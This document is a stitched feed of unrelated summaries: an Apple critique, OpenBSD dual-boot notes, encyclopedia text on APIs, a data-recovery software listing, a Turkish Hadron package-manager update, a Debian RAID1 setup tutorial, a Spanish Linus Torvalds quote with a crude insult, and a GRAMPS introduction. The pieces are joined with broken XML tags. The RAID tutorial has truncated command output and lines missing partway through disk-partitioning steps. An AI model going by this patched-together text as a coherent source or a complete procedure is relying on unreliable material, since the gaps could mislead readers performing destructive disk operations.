Apple invented the smartphone: Wow, before the iPhone was even an idea, I owned a Symbian and Windows smartphone. They were pretty good, and not a far cry from what we consider a smartphone now. The main difference between smartphones then and now is power (which would have come from Moore’s law anyway) and the various application market places. RIM’s Blackberry and the original Android (before Google’s acquisition) were on-track with this. Apple simply packaged up an acceptable UI in expensive hardware. It’s amusing to see the patent wars in the smartphone market – I’ll credit Apple with multi-touch and clean design, but now Apple is copying their competitors and making security mistakes worthy of Microsoft 10 years ago (Siri usable on locked phones for example). 
Apple created Mac OS X: Yes. Yes they did. Canonical created Ubuntu too. By create, what we mean here is: Assembled an operating system from existing technology created by other companies. As much as Ubuntu is Linux, Mac OS X is Nextstep, and by extension OpenBSD. They both happen to share their roots in free Unix clones, and you can download a large portion of Apple Mac OS X as Darwin. They’ve had to keep a portion of their operating system open source because it was based on an open source project. Mac OS X includes a massive amount of open source software, and isn’t a far cry from Linux itself. It’s shipped with Apache, PHP and even Safari is a version of the KDE projects Konqueror.  
The difference between Canonical and Apple? Canonical makes a large contribution back to the community that fed it. 
If you’re going to praise Steve Jobs for his fantastic contribution to technology and computing, do you with respect to the facts. 
Steve Jobs, master of design and foresight, RIP 2011.]]></summary>

  <title><![CDATA[Prepare your hardware normally]]></title>
  <summary><![CDATA[For this example, I’m dividing a 20GB IDE hard drive between Windows XP and OpenBSD. The first 7GB of the hard drive hold a standard install of Windows XP, on a FAT32 file system. I want to put an 8GB OpenBSD install immediately after that. Prepare your hardware as you normally would, and boot off your OpenBSD installation disk. The install process is identical up until the point you see the disk usage menu. 

Available disks are: sd0 sd1 wd0.
Which one is the root disk? (or done) [done] wd0
Do you want to use *all* of wd0 for OpenBSD? [no]


We don’t want to use the whole hard drive for OpenBSD, so take the default. This brings up a whole new tool, OpenBSD’s interactive fdisk(8).]]></summary>

  <title><![CDATA[Use fips.exe to resize your hard drive]]></title>
  <summary><![CDATA[While early editions of Windows 95 only handled 2GB partitions, most later versions handle large hard drives just fine and automatically take over all the disk space they can get. Most versions do not ask you how much they should get, as it’s obvious that anyone who is running Windows wants to dedicate their whole machine to it, right? You must use a tool such as fips.exe to resize your hard drive. 
OpenBSD includes fips.exe in the “tools” directory under the release directory. The documentation included with fips.exe is fairly good, and Windows 9x is becoming increasingly rare among the people likely to be installing dual-boot systems, so we aren’t going to go into any detail on how to make it work. Just read the instructions and follow them precicely. 
Remember, make your Windows 9x partition no larger than 7.5GB; you want to have enough room to get an OpenBSD root partition on your system!

  <title><![CDATA[What is API]]></title>
  <summary><![CDATA[Web APIs  Main article: web service When used in the context of web development, an API is typically a defined set of Hypertext Transfer Protocol (HTTP) request messages, along with a definition of the structure of response messages, which is usually in an Extensible Markup Language (XML) or JavaScript Object Notation (JSON) format. While "Web API" is virtually a synonym for web service, the recent trend (so-called Web 2.0) has been moving away from Simple Object Access Protocol (SOAP) based services towards more direct Representational State Transfer (REST) style communications.[7] Web APIs allow the combination of multiple services into new applications known as mashups.[8] [edit]Use of APIs to share content  The practice of publishing APIs has allowed web communities to create an open architecture for sharing content and data between communities and applications. In this way, content that is created in one place can be dynamically posted and updated in multiple locations on the web. Photos can be shared from sites like Flickr and Photobucket to social network sites like Facebook and MySpace. Content can be embedded, e.g. embedding a presentation from SlideShare on a LinkedIn profile. Content can be dynamically posted. Sharing live comments made on Twitter with a Facebook account, for example, is enabled by their APIs. Video content can be embedded on sites which are served by another host. User information can be shared from web communities to outside applications, delivering new functionality to the web community that shares its user data via an open API. One of the best examples of this is the Facebook Application platform. Another is the Open Social platform.[9] [edit]Implementations  The POSIX standard defines an API that allows a wide range of common computing functions to be written in a way such that they may operate on many different systems (Mac OS X, and various Berkeley Software Distributions (BSDs) implement this interface); however, making use of this requires re-compiling for each platform. A compatible API, on the other hand, allows compiled object code to function without any changes to the system implementing that API. This is beneficial to both software providers (where they may distribute existing software on new systems without producing and distributing upgrades) and users (where they may install older software on their new systems without purchasing upgrades), although this generally requires that various software libraries implement the necessary APIs as well. Microsoft has shown a strong commitment to a backward compatible API, particularly within their Windows API (Win32) library, such that older applications may run on newer versions of Windows using an executable-specific setting called "Compatibility Mode".[10] Apple Inc. has shown less concern, breaking compatibility or implementing an API in a slower "emulation mode"; this allows greater freedom in development, at the cost of making older software obsolete.[citation needed] Among Unix-like operating systems, there are many related but incompatible operating systems running on a common hardware platform (particularly Intel 80386-compatible systems). There have been several attempts to standardize the API such that software vendors may distribute one binary application for all these systems; however, to date, none of these have met with much success. The Linux Standard Base is attempting to do this for the Linux platform, while many of the BSD Unixes, such as FreeBSD, NetBSD, and OpenBSD, implement various levels of API compatibility for both backward compatibility (allowing programs written for older versions to run on newer distributions of the system) and cross-platform compatibility (allowing execution of foreign code without recompiling). [edit]Release policies  The two options for releasing API are: Protecting information on APIs from the general public. For example, Sony used to make its official PlayStation 2 API available only to licensed PlayStation developers. This enabled Sony to control who wrote PlayStation 2 games. This gives companies quality control privileges and can provide them with potential licensing revenue streams. Making APIs freely available. For example, Microsoft makes the Microsoft Windows API public, and Apple releases its APIs Carbon and Cocoa, so that software can be written for their platforms. A mix of the two behaviors can be used as well. [edit]ABIs  The related term application binary interface (ABI) is a lower level definition concerning details at the assembly language level. For example, the Linux Standard Base is an ABI, while POSIX is an API.[11] [edit]API examples  See also: Category:Application programming interfaces ASPI for SCSI device interfacing Carbon and Cocoa for the Macintosh DirectX for Microsoft Windows EHLLAPI Java APIs OpenGL cross-platform graphics API OpenAL cross-platform sound API OpenCL cross-platform API for general-purpose computing for CPUs & GPUs OpenMP API that supports multi-platform shared memory multiprocessing programming in C, C++ and Fortran on many architectures, including Unix and Microsoft Windows platforms. Simple DirectMedia Layer (SDL) Talend integrates its data management with BPM from Bonita Open Solution Windows API [edit]Language bindings and interface generators  APIs that are intended to be used by more than one high-level programming language often provide, or are augmented with, facilities to automatically map the API to features (syntactic or semantic) that are more natural in those languages. This is known as language binding, and is itself an API. The aim is to encapsulate most of the required functionality of the API, leaving a "thin" layer appropriate to each language. Below are listed some interface generator tools which bind languages to APIs at compile time. SWIG open-source interfaces bindings generator from many languages to many languages (Typically Compiled->Scripted) F2PY:[12] Fortran to Python interface generator.]]></summary>

  <title><![CDATA[R-Studio 5.4 Build 134259 Corporate (x86/x64)]]></title>
  <summary><![CDATA[R-Studio is a family of powerful and cost-effective undelete and data recovery software. Empowered by the new unique data recovery technologies, it is the most comprehensive data recovery solution for recovery files from FAT12/16/32, NTFS, NTFS5 (created or updated by Windows 2000/XP/2003/Vista), HFS/HFS+ (Macintosh), Little and Big Endian variants of UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) and Ext2FS/Ext3FS (Linux) partitions. It functions on local and network disks, even if such partitions are formatted, damaged or deleted. Flexible parameter settings give you absolute control over data recovery. 
The R-Studio data recovery software was originally developed for use by data recovery experts, system administrators, IT professionals, and advanced and experienced computer users. Some of R-Studio's features were even designed exclusively for computer forensic experts, and most R-Studio users don't need every single feature of the software. 
 
Because of the many features presented in R-Studio, there may be inexperienced users who find its interface and abundant functionality a bit confusing. We've actually tried to simplify the software interface as much as possible and have included a detailed Help Manual with the product. However, we recommend to those who still feel uncomfortable with the software after reading the Manual that they start their data recovery experience with the R-Undelete file recovery tool. Its three-step wizard-oriented user interface provides an easier way to perform ordinary data recovery tasks without any compromise to their efficiency. It's the best choice for basic and some advanced data recovery needs. Below you may compare the main features of R-Studio and R-Undelete. 
 
 
R-Studio utilities recover files: 
• Deleted without Recycle Bin, or when Recycle Bin has been emptied; 
• Removed by virus attack or power failure; 
• After the partition with the files was reformatted, even for different file system; 
• When the partition structure on a hard disk was changed or damaged. In this case, R-Studio utilities can scan the hard disk trying to find previously existed partitions and recover files from found partitions. 
• From hard disk with bad sectors. R-Studio Data Recovery Software can first copy the entire disk or its part into an image file and then process such image file. This is especially useful when new bad sectors are constantly appearing on the hard disk, and remaining information must be immediately saved. 
 
R-Studio Data Recovery Features : 
• Standard "Windows Explorer" - style interface. 
• Host OS: Windows 9x, ME, NT, 2000, XP, 2003 Server, Vista. 
• Data recovery over the Network. Files can be recovered on network computers running Win95/98/ME/NT/2000/XP/2003/Vista, Macintosh, Linux and UNIX. 
• Supported file systems: FAT12, FAT16, FAT32,NTFS, NTFS5 (created or updated by Win2000/XP/2003/Vista), HFS/HFS+ (Macintosh), Little and Big Endian variants of UFS1/UFS2 (FreeBSD/OpenBSD/NetBSD/Solaris) and Ext2FS/Ext3FS (Linux). 
• Recognition and parsing Dynamic (Windows 2000/XP/2003/Vista), Basic(MBR) and BSD (UNIX) partitions layout schema and Apple partition map. Dynamic partitions over GPT are supported as well as dynamic partitions over MBR. 
• Damaged RAID recovery. If OS cannot recognize your RAID, you can create a virtual RAID from its components. Such virtual RAID can be processed like a real one. 
• Creates IMAGE FILES for an entire Hard Disk, Partition or its part. Such image files can be compressed and split into several files to put it on CD/DVD/Flash or FAT16/FAT32. Then the image files can be processed like regular disks. 
Data recovery on damaged or deleted partitions, encrypted files (NTFS 5), alternative data streams (NTFS, NTFS 5). 
• Recovering data if: 
* FDISK or other disk utilities have been run; 
* VIRUS has invaded; FAT is damaged; MBR is destroyed. 
• Recognizes localized names. 
• Recovered files can be saved on any (including network) disks accessible by the host operating system. 
• File or disk content can be viewed and edited with the advanced hexadecimal editor. The editor supports NTFS file attribute editing. 
 
New R-Studio features in version 5.x: 
* RAID 6 support, including Reed-Solomon and Vertical XOR. Support for custom-specified RAID 6 layouts. 
* Advanced object copy. In addition to byte to byte copy of any object visible in the Drives panel, smart copy of partitions and hard drives with size and offset adjustment is available. 
* Support for 64- and 32-bit Windows versions. Under a 64-bit Windows, R-Studio overcomes the 3GB RAM limit for a 32-bit application and utilizes all physical RAM installed in the 64-bit Windows machine. This greatly enhances performance of the software, especially when scanning high-capacity disks.

  <summary><![CDATA[Sürüm çıkaralı çok olmuş, yazı yazmayalı da. Aylardır yaptığımız çalışmalar sanırım bir blog yazısını hakediyor. 
Mayıs ayından beri Hadron cephesinde olan en iyi şey geliştirici sayısının 1′den 3′e çıkması oldu sanırım. Gürkan Gür ve Erdem Artan artık Hadron’a aktif katkı veriyorlar. Gitorious‘daki RSS beslemesinden neler yaptıklarını görebilirsiniz. 
İkisinin birden paket yapmaya ve varolanlara bakmaya başlamasıyla üzerimdeki yük gayet azaldı. Azaldı derken boşa çıktığımı düşünmeyin. Temmuz ayından itibaren çalışıyorum, kendime ve Hadron’a ayırdığım zaman da bir hayli azaldı. Herşeyi bir arada düşündüğünüz zaman ~600 kadar paketi ve paket yöneticisini tek başıma yapmış kadar yoruluyorum, neyse. 
Artık paketlerle daha az ilgilendiğim için Hadron’a ayırdığım vakti lpms üzerine yoğunlaştırıyorum. Hata kayıt sitemizden de görebileceğiniz gibi üzerimde şu an 30 kadar hata var ve bunların çok büyük bir kısmı lpms ile ilgili ya hata düzeltmesi ya da özellik isteği. 
Sırası gelmişken lpms’de neler yaptığımı ve neler yapmayı planladığımı anlatayım: 
lpms son rootfs sürümündeki atasının aksine şu an çok daha gelişkin ve olgun. Sanırım satır sayısı iki katına kadar çıktı ve pek çok yeni özellik ekledim. Bunlar irili ufaklı şeyler, bazılarını ben bile hatırlamıyorum ama bağımlılık çözme işlerini halleden lpms modülündeki commit sayısı lpms’e yaptığım toplam commit sayısının üçte birine yakın olabilir. Hala hataları var; zira oldukça karmaşık bir iş yapıyor. Sıkıntıları devam edecektir. 
Geçen hafta sonu Hadron mesaimin bir kısmını lpms’i OpenBSD‘ye port etmeye harcadım.  Gerekli modifikasyonları yaptıktan sonra, sorunlar olsa da, OpenBSD üzerinde Hadron paketlerini derlemeyi/kurmayı başardım. Yani lpms, BSD ailesinden bir UNIX sistem üzerinde de çalışabilen bir paket yöneticisi şu an. Muhtemelen orta vadede sadece ben kullanabilirim ama; lpms’i Linux ve BSD sistemler üzerinde çalışabilen “evrensel” bir paket yöneticisi yapma hedefimi de açık etmiş olayım burada. 
lpms paketleri kaynaktan derleyerek sisteme kuruyor biliyorsunuz. Bu bizim UNIX sistemi kullanma tarzımız ve bu konuda iyi bir paket yöneticisi çıkarmaya çalışıyoruz. Ama bazen binary paket lazım olabiliyor ve lpms şu an binary(bildiğiniz deb ya da rpm paketleri gibi) kuramıyor. Bu bir eksiklik evet ama; lpms’in konsepti paketleri kullanıcının bilgisayarı üzerinde derleyerek, hem herkesin istediği gibi bir sistem elde etmesini hem de ileri düzeyde işlemci optimizasyonlarının yapılmasını sağlamak üzerine kurulu. Gentoo ya da BSD’de ciddi deneyimi olanlar bu konuları bilirler zaten. 
lpms’in gelecek sürümlerde binary paketleri kurup kaldırabilmesini ve hatta binary depoları oluşturup yönetebilmesini planlıyorum. Bu sayede hibrit bir paket yöneticisi ortaya çıkarmış olacağız. Ama Hadron hiç bir zaman binary paket deposu sağlamayacak. Bu özelliği 3. şahıslar ya da projeler kullanacak. 
Bir diğer hedefim ise Debian‘daki debconf‘un bir benzerini lpms için yazmak. Bu konu henüz tasarım tahtasında bile değil. Orta vadede mümkün, muhtemelen 2012 yılı içinde çalışacağımız bir konu olacak. 
Tüm bunları gerçekleştirdiğim zaman modern altyapılar kullanan BSD tarzı bir UNIX sistem yaratma konusundaki hevesimi biraz daha tatmin etmiş olacağım. 
En son ve en çok arzuladığım iş ise Hadron’un altyapılarını tamamen Python 3‘e taşımak. Grafik arayüzlü araçlar gibi bizim açımızdan tamamen anlamsız hedeflerimiz olmadığı için GTK+ gibi şeylerin Python 3 tarafından desteklenmiyor olması umrumda değil ama sandboxing uygulaması olarak kullandığımız catbox C ile yazılmış bir Python 2 uygulaması olduğu için geçiş yapamıyoruz. Aslında catbox’u Python 3′e taşımak altından kalkamayacağım bir iş değil. Ama yeterince C ve bu dille Python modülü yazma tecrübem olmadığı için zorlanabilirim. Ve sonradan çıkacak hataların da faturası canımızı çok yakabilir. O yüzden girişmiyorum ama; Python 2.7.2 ile Python 3′teki tüm yenilikleri kullanarak kod yazıyorum, o da ayrı bir mesele. 
Dökümantasyon işi de fena gitmiyor. Gürkan Hadron’la ilgililenmeye başladıktan sonra benim yazdıklarımı güncelleştirerek İngilizceye çevirdi. Dökümanlar HadronWiki’de duruyor. Girip okuyabilirsiniz. 
Her Hadron yazısına eklediğim gibi buna da projenin sayfalarını ekleyeyim. İlgilenmek isteyen olursa hiç çekinmesin buyursun. Freenode üzerindeki #hadron kanalında ilgili birilerini bulma olasılığınız çok yüksek.

  <title><![CDATA[How To Set Up Software RAID1 On A Running System]]></title>
  <summary><![CDATA[This guide explains how to set up software RAID1 on an already
running Debian Squeeze system. The GRUB2 bootloader will be configured
in such a way that the system will still be able to boot if one of the
hard drives fails (no matter which one).      I do not issue any guarantee that this will work for you! 
  
1 Preliminary Note
In this tutorial I'm using a Debian Squeeze system with two hard drives, /dev/sda and /dev/sdb which are identical in size. /dev/sdb is currently unused, and /dev/sda has the following partitions: 
/dev/sda1: /boot partition, ext4;
/dev/sda2: swap;
/dev/sda3: / partition, ext4

In the end I want to have the following situation: 
/dev/md0 (made up of /dev/sda1 and /dev/sdb1): /boot partition, ext4;
/dev/md1 (made up of /dev/sda2 and /dev/sdb2): swap;
  /dev/md2 (made up of /dev/sda3 and /dev/sdb3): / partition, ext4

This is the current situation:

2 Installing mdadm
The most important tool for setting up RAID is mdadm. Let's install it like this: 
apt-get install initramfs-tools mdadm 
MD arrays needed for the root file system: <-- all  
Afterwards, we load a few kernel modules (to avoid a reboot): 
modprobe linear 
modprobe multipath 
modprobe raid0 
modprobe raid1 
modprobe raid5 
modprobe raid6 
modprobe raid10 
Now run 
cat /proc/mdstat 
The output should look as follows: 
root@server1:~# cat /proc/mdstat 
Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10] 
unused devices:  
root@server1:~# 
  
3 Preparing /dev/sdb
To create a RAID1 array on our already running system, we must prepare the /dev/sdb hard drive for RAID1, then copy the contents of our /dev/sda hard drive to it, and finally add /dev/sda to the RAID1 array.  
First, we copy the partition table from /dev/sda to /dev/sdb so that both disks have exactly the same layout: 
sfdisk -d /dev/sda | sfdisk --force /dev/sdb 
The output should be as follows: 
root@server1:~# sfdisk -d /dev/sda | sfdisk --force /dev/sdb 
Checking that no-one is using this disk right now ... 
OK 
 
Disk /dev/sdb: 652 cylinders, 255 heads, 63 sectors/track 
 
sfdisk: ERROR: sector 0 does not have an msdos signature 
 /dev/sdb: unrecognized partition table type 
Old situation: 
No partitions found 
New situation:

/dev/sdb4             0         -          0   0  Empty 
Warning: partition 1 does not end at a cylinder boundary

If you created or changed a DOS partition, /dev/foo7, say, then use dd(1)

(See fdisk(8).) 
root@server1:~# 
The command 
fdisk -l 
should now show that both HDDs have the same layout:

root@server1:~# 
To make sure that there are no remains from previous RAID installations on /dev/sdb, we run the following commands: 
mdadm --zero-superblock /dev/sdb1 
mdadm --zero-superblock /dev/sdb2 
mdadm --zero-superblock /dev/sdb3 
If there are no remains from previous RAID installations, each of the
above commands will throw an error like this one (which is nothing to
worry about): 
root@server1:~# mdadm --zero-superblock /dev/sdb1 
mdadm: Unrecognised md component device - /dev/sdb1 
root@server1:~# 
Otherwise the commands will not display anything at all. 
4 Creating Our RAID Arrays
 Now let's create our RAID arrays /dev/md0, /dev/md1, and /dev/md2. /dev/sdb1 will be added to /dev/md0, /dev/sdb2 to /dev/md1, and /dev/sdb3 to /dev/md2. /dev/sda1, /dev/sda2, and /dev/sda3 can't be added right now (because the system is currently running on them), therefore we use the placeholder missing in the following three commands: 
mdadm --create /dev/md0 --level=1 --raid-disks=2 missing /dev/sdb1 
  mdadm --create /dev/md1 --level=1 --raid-disks=2 missing /dev/sdb2 
  mdadm --create /dev/md2 --level=1 --raid-disks=2 missing /dev/sdb3 
You might see the following message for each command - just press y to continue: 
root@server1:~# mdadm --create /dev/md2 --level=1 --raid-disks=2 missing /dev/sdb3 
mdadm: Note: this array has metadata at the start and 
    may not be suitable as a boot device.  If you plan to 
    store '/boot' on this device please ensure that 
    your boot-loader understands md/v1.x metadata, or use 
    --metadata=0.90 
Continue creating array? <-- y 
mdadm: Defaulting to version 1.2 metadata 
mdadm: array /dev/md2 started. 
root@server1:~#  
The command  
cat /proc/mdstat 
should now show that you have three degraded RAID arrays ([_U] or [U_] means that an array is degraded while [UU] means that the array is ok): 
root@server1:~# cat /proc/mdstat 
Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10] 
md2 : active raid1 sdb3[1] 
      4241396 blocks super 1.2 [2/1] [_U] 
 
md1 : active raid1 sdb2[1] 
      499700 blocks super 1.2 [2/1] [_U] 
 
md0 : active raid1 sdb1[1] 
      498676 blocks super 1.2 [2/1] [_U] 
 
unused devices:  
root@server1:~# 
Next we create filesystems on our RAID arrays (ext4 on /dev/md0 and /dev/md2 and swap on /dev/md1): 
mkfs.ext4 /dev/md0 
mkswap /dev/md1 
mkfs.ext4 /dev/md2 
Next we must adjust /etc/mdadm/mdadm.conf (which doesn't contain any information about our new RAID arrays yet) to the new situation: 
cp /etc/mdadm/mdadm.conf /etc/mdadm/mdadm.conf_orig 
mdadm --examine --scan >> /etc/mdadm/mdadm.conf 
Display the contents of the file: 
cat /etc/mdadm/mdadm.conf 
At the bottom of the file you should now see details about our three (degraded) RAID arrays: 



# mdadm.conf
#
# Please refer to mdadm.conf(5) for information about this file.
#
# by default, scan all partitions (/proc/partitions) for MD superblocks.
# alternatively, specify devices to scan, using wildcards if desired.

5 Adjusting The System To RAID1
Now let's mount /dev/md0 and /dev/md2 (we don't need to mount the swap array /dev/md1): 
mkdir /mnt/md0 
mkdir /mnt/md2 
mount /dev/md0 /mnt/md0 
mount /dev/md2 /mnt/md2 
You should now find both arrays in the output of 
mount 
root@server1:~# mount 
/dev/sda3 on / type ext4 (rw,errors=remount-ro) 
tmpfs on /lib/init/rw type tmpfs (rw,nosuid,mode=0755) 
proc on /proc type proc (rw,noexec,nosuid,nodev) 
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev) 
udev on /dev type tmpfs (rw,mode=0755) 
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev) 
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=620) 
/dev/sda1 on /boot type ext4 (rw) 
/dev/md0 on /mnt/md0 type ext4 (rw) 
/dev/md2 on /mnt/md2 type ext4 (rw) 
root@server1:~# 
Next we modify /etc/fstab. Comment out the current /, /boot, and swap partitions and add new lines for them where you replace the UUIDs with /dev/md0 (for the /boot partition), /dev/md1 (for the swap partition) and /dev/md2 (for the / partition)  so that the file looks as follows: 
vi /etc/fstab 



# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
#                
proc            /proc           proc    defaults        0       0
# / was on /dev/sda3 during installation
#UUID=e4e38871-0115-477d-94f9-34b079d26248 /               ext4    errors=remount-ro 0       1
/dev/md2 /               ext4    errors=remount-ro 0       1
# /boot was on /dev/sda1 during installation
#UUID=7e2fb013-073e-4312-a669-f34b35069bfb /boot           ext4    defaults        0       2
/dev/md0 /boot           ext4    defaults        0       2
# swap was on /dev/sda2 during installation
#UUID=1a5951f8-d0ab-4e0e-b42a-871f81b6fd82 none            swap    sw              0       0
/dev/md1 none            swap    sw              0       0
/dev/scd0       /media/cdrom0   udf,iso9660 user,noauto     0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto  0       0



Next replace /dev/sda1 with /dev/md0 and /dev/sda3 with /dev/md2 in /etc/mtab: 
vi /etc/mtab 



/dev/md2 / ext4 rw,errors=remount-ro 0 0
tmpfs /lib/init/rw tmpfs rw,nosuid,mode=0755 0 0
proc /proc proc rw,noexec,nosuid,nodev 0 0
sysfs /sys sysfs rw,noexec,nosuid,nodev 0 0
udev /dev tmpfs rw,mode=0755 0 0
tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0
devpts /dev/pts devpts rw,noexec,nosuid,gid=5,mode=620 0 0
/dev/md0 /boot ext4 rw 0 0
/dev/md0 /mnt/md0 ext4 rw 0 0
/dev/md2 /mnt/md2 ext4 rw 0 0



Now up to the GRUB2 boot loader. Create the file /etc/grub.d/09_swraid1_setup as follows: 
cp /etc/grub.d/40_custom /etc/grub.d/09_swraid1_setup 
vi /etc/grub.d/09_swraid1_setup 



#!/bin/sh
exec tail -n +3 $0
# This file provides an easy way to add custom menu entries.  Simply type the
# menu entries you want to add after this comment.  Be careful not to change
# the 'exec tail' line above.
menuentry 'Debian GNU/Linux, with Linux 2.6.32-5-amd64' --class debian --class gnu-linux --class gnu --class os {
insmod raid
insmod mdraid
insmod part_msdos
insmod ext2
set root='(md/0)'
echo    'Loading Linux 2.6.32-5-amd64 ...'
linux   /vmlinuz-2.6.32-5-amd64 root=/dev/md2 ro  quiet
echo    'Loading initial ramdisk ...'
initrd  /initrd.img-2.6.32-5-amd64
}



Make sure you use the correct kernel version in the menuentry stanza (in the linux and initrd lines). You can find it out by running 
uname -r 
or by taking a look at the current menuentry stanzas in the ### BEGIN /etc/grub.d/10_linux ### section in /boot/grub/grub.cfg. Also make sure that you use root=/dev/md2 in the linux line. 
The important part in our new menuentry stanza is the line set root='(md/0)' - it makes sure that we boot from our RAID1 array /dev/md0 (which will hold the /boot partition) instead of /dev/sda or /dev/sdb which is important if one of our hard drives fails - the system will still be able to boot.  
Because we don't use UUIDs anymore for our block devices, open /etc/default/grub... 
vi /etc/default/grub 
... and uncomment the line GRUB_DISABLE_LINUX_UUID=true: 



# If you change this file, run 'update-grub' afterwards to update
# /boot/grub/grub.cfg.
GRUB_DEFAULT=0
GRUB_TIMEOUT=5
GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT="quiet"
GRUB_CMDLINE_LINUX=""
# Uncomment to enable BadRAM filtering, modify to suit your needs
# This works with Linux (no patch required) and with any kernel that obtains
# the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)
#GRUB_BADRAM="0x01234567,0xfefefefe,0x89abcdef,0xefefefef"
# Uncomment to disable graphical terminal (grub-pc only)
#GRUB_TERMINAL=console
# The resolution used on graphical terminal
# note that you can use only modes which your graphic card supports via VBE
# you can see them in real GRUB with the command `vbeinfo'
#GRUB_GFXMODE=640x480
# Uncomment if you don't want GRUB to pass "root=UUID=xxx" parameter to Linux
GRUB_DISABLE_LINUX_UUID=true
# Uncomment to disable generation of recovery mode menu entries
#GRUB_DISABLE_LINUX_RECOVERY="true"
# Uncomment to get a beep at grub start
#GRUB_INIT_TUNE="480 440 1"



Run 
update-grub  
to write our new kernel stanza from /etc/grub.d/09_swraid1_setup to /boot/grub/grub.cfg. 
Next we adjust our ramdisk to the new situation: 
update-initramfs -u 
Now we copy the contents of /dev/sda1 and /dev/sda3 to /dev/md0 and /dev/md2 (which are mounted on /mnt/md0 and /mnt/md2): 
cp -dpRx / /mnt/md2 
cd /boot 
cp -dpRx . /mnt/md0 
  
6 Preparing GRUB2 (Part 1) 
Afterwards we must make sure that the GRUB2 bootloader is installed on both hard drives, /dev/sda and /dev/sdb: 
grub-install /dev/sda 
grub-install /dev/sdb 
Now we reboot the system and hope that it boots ok from our RAID arrays: 
reboot 
7 Preparing /dev/sda
 If all goes well, you should now find /dev/md0 and /dev/md2 in the output of 
df -h 
root@server1:~# df -h 
Filesystem            Size  Used Avail Use% Mounted on 
/dev/md2              4.0G  714M  3.1G  19% /

/dev/md0              472M   25M  423M   6% /boot 
root@server1:~# 
The output of  
cat /proc/mdstat 
should be as follows: 
root@server1:~# cat /proc/mdstat 
Personalities : [raid1] 
md2 : active raid1 sdb3[1] 
      4241396 blocks super 1.2 [2/1] [_U]

      499700 blocks super 1.2 [2/1] [_U] 
 
md0 : active raid1 sdb1[1] 
      498676 blocks super 1.2 [2/1] [_U] 
 
unused devices:  
root@server1:~# 
Now we must change the partition types of our three partitions on /dev/sda to Linux raid autodetect as well: 
fdisk /dev/sda 
root@server1:~# fdisk /dev/sda 
 
WARNING: DOS-compatible mode is deprecated. It's strongly recommended to 
         switch off the mode (command 'c') and change display units to

root@server1:~# 
Now we can add /dev/sda1, /dev/sda2, and /dev/sda3 to the respective RAID arrays: 
mdadm --add /dev/md0 /dev/sda1 
mdadm --add /dev/md1 /dev/sda2 
mdadm --add /dev/md2 /dev/sda3 
Now take a look at 
cat /proc/mdstat 
... and you should see that the RAID arrays are being synchronized: 
root@server1:~# cat /proc/mdstat 
Personalities : [raid1] 
md2 : active raid1 sda3[2] sdb3[1] 
      4241396 blocks super 1.2 [2/1] [_U] 
      [==========>..........]  recovery = 54.6% (2319808/4241396) finish=0.7min speed=45058]]></summary>

  <summary><![CDATA[Linus Tordvals es un genio  No sólo fue el creador de la primera versión del kernel linux. Además lo está coordinando desde hace muchos años y por el camino, creó el mejor, o uno de los mejores repositorios de versiones, sólo porque le hacía falta y lo que había el lo consideraba una mierda.  Y tiene todo el derecho del mundo a decir que es una mierda lo que había, porque da su alternativa. Y además, su alternativa resulta ser fantástica    Me parece simpático, cercano y gracioso  Me cae muy bien    Ya sabemos que su fuerte no es ser políticamente correcto.   Ahí va otro ejemplo...   “Por cierto, y puede que no os guste esto, ya que estáis tan centrados en la seguridad, una de las razones por las que me niego a entrar en ese circo de la seguridad es que glorifica -y por tanto refuerza- una mala actitud. Hace que la gente del mundo de la seguridad se conviertan en “héroes”, como si la gente que no hace más que corregir errores normales no fueran tan importantes. De hecho, todos esos errores normales y aburridos son mucho_más_importantes, simplemente porque hay muchos más. No creo que un espectacular agujero de seguridad deba ser glorificado o que se ponga tanto cuidado en él y que sea más especial que cualquier espaectacular cuelgue debido a un mal interbloqueo. La gente del mundo de la seguridad a menudo es el tipo de gente de blanco-o-negro que yo no soporto. Creo que la gente de OpenBSD no son más que un puñado de monos masturbándose, en el sentido de que le dan tanta importancia al hecho de que sólo se centran en la seguridad que parecen admitir que no hay nada más que les importe. Para mi la seguridad es importante. Pero no es menos importante que todo el resto de cosas que también son importantes”.]]></summary>

  <title><![CDATA[Les presentamos a GRAMPS]]></title>
  <summary><![CDATA[GRAMPS, es un proyecto de software libre abierto a la comunidad genealógica. Creado y mantenido por genealogistas, se ofrece como una muy buena alternativa a la hora de elegir entre las múltiples opciones existentes.




 
La comunidad creada, desarrollada y manejada por genealogistas que sustenta este proyecto, ofrece varias herramientas además del programa genealógico en sí. Cuentan con un blog propio, un wiki en varios idiomas donde se centraliza toda la documentación: manuales de instalación, guías de uso y un apartado especial donde se dan lineamientos para comenzar en genealogía. Y también proveen de alojamiento web gratuito para que los usuarios del programa puedan publicar su árbol, sin que tengamos que preocuparnos de conseguir uno. 

Actualización: GRAMPS ya no provee alojamiento web gratuito debido a las limitaciones de su cuenta de hosting. En su web, puede leerse Due to limitations of our hosting account, we are no longer able to host sites for Gramps users. 

Características del programa
 

Corre bajo una gran cantidad de Sistemas Operativos. Todos los derivados de las grandes distribuciones de Linux como Debian, Gentoo, Mandriva, Red Hat y OpenSuse. Bajo Windows, se deben cumplir con ciertos requisitos antes de su instalación (ver más abajo), pero nuestra experiencia al ejecutarlo en XP ha sido muy buena. MacOS, Free/OpenBSD y Solaris, tienen instrucciones especiales de instalación que podemos leer en su wiki (en inglés).
Es multilenguaje y el idioma predeterminado puede elegirse durante la instalación.
Las opciones de Importación / Exportación soportan varios formatos:

GEDCOM
GRAMPS: propio del programa para compartir con otros usuarios.
Exportación directa a formato CD para los usuarios de Linux en entornos Gnome, y
WTF (Web Family Tree), que permite la exportación en un único archivo en lugar de múltiples páginas html para su publicación en web.
Cuenta con un amplio conjunto de Herramientas que permite:
Controlar errores y consistencia en la base de datos.
Efectuar controles de investigación y análisis mediante la comparación de eventos, duplicidad de personas y otros.
